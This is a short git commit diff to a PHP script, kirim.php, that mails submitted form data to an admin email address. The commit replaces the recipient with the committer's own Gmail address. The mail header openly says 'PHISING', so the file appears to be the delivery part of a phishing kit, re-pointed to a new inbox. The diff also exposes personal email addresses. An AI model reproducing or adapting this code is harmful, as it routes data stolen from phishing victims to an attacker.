89427e91c4618596afe23f5fe9b8c1519f0101e7
arinurrahman <64953923+arinurrahman@users.noreply.github.com>
2022-12-04 00:26:12 +0700

    Update kirim.php

--- kirim.php
+++ kirim.php
@@ -1,6 +1,6 @@
 <?php
 if($_POST['kirim']){
-	$admin = 'satria.bagus18@gmail.com'; //ganti email dg email admin (email penerima pesan)
+	$admin = 'arinurrahman37@gmail.com'; //ganti email dg email admin (email penerima pesan)
 	$judul	= 'GMNI LITERATION FAIR 2018'; //judul email
 	$headers = 'From: admin@pure-five.tk ' . ' PHISING ' . "\r\n" . '===================================='; //header isi email
 
